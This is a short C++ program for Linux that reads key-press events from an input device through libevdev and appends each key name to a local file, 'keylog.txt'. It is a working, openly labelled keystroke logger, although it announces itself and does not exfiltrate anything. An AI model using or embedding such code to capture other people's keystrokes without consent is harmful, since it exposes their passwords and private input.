#include <iostream>
#include <fstream>
#include <libevdev/libevdev.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <input_device>" << std::endl;
        return 1;
    }

    const char* device_path = argv[1];
    struct libevdev* dev = nullptr;
    int fd = open(device_path, O_RDONLY | O_NONBLOCK);

    if (fd < 0) {
        std::cerr << "Failed to open device: " << device_path << std::endl;
        return 1;
    }

    int rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        std::cerr << "Failed to initialize libevdev (" << rc << ")" << std::endl;
        close(fd);
        return 1;
    }

    std::ofstream logfile("keylog.txt", std::ios::app);
    if (!logfile.is_open()) {
        std::cerr << "Failed to open keylog.txt for writing." << std::endl;
        libevdev_free(dev);
        close(fd);
        return 1;
    }

    std::cout << "Listening for key events on " << device_path << std::endl;

    while (true) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);

        if (rc == 0 && ev.type == EV_KEY && ev.value == 1) {
            logfile << "Key: " << libevdev_event_code_get_name(ev.type, ev.code) << std::endl;
        } else if (rc == -EAGAIN) {
            usleep(1000);
        } else if (rc < 0) {
            std::cerr << "Error reading events: " << rc << std::endl;
            break;
        }
    }

    logfile.close();
    libevdev_free(dev);
    close(fd);
    return 0;
}
